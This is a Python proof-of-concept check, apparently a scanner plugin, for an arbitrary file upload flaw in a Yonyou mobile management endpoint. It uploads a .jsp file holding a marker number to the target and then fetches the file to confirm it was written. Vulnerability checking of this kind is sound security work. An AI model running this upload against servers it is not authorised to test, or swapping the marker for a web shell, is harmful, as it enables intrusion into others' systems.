import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友移动系统管理uploadApk接口存在任意文件上传',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = '''--fa48ebfef59b133a8cd5275661b35d2c
    Content-Disposition: form-data; name="downloadpath"; filename="5921209.jsp"
    Content-Type: application/msword

    082863327
    --fa48ebfef59b133a8cd5275661b35d2c--'''
    vurl = urllib.parse.urljoin(url, "/maportal/appmanager/uploadApk.dopk_obj=")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            response = requests.get(url+'/maupload/apk/5921209.jsp')
            if response.status_code == 200 and '082863327' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult